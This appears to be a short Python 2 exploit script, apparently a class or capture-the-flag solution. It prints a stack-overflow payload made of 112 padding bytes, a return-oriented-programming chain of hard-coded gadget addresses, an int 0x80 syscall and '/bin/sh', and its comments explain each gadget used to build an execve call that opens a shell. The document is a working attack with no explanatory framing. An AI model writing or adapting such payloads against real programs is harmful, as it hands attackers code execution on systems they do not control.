from shellcode import shellcode
from struct import pack


print "A"*112 +  pack("<I", 0x08049873) + "A"*12 + pack("<I", 0x0805ae10) + "A"*12 + pack("<I", 0x08055060) + pack("<I", 0x0806d42c)*11 + pack("<I", 0x080481d1) + pack("<I", 0xbffeb078) +  pack("<I", 0x0806dd23) + "/bin/sh"

#instr to set eax to 0
#pack("<I", 0x08055060)

#mov eax to edx
#0x0805aad3 + "AAAAAAAA"

#mov eax to ecx
#0x08049873 + "AAAAAAAA"

#add eax 11 has a pop
#0x08090d62

#call int 0x80
#0x0806dd23

#buffer starts at 0xbffeafac

#pop ebx instr
#0x0805d45a

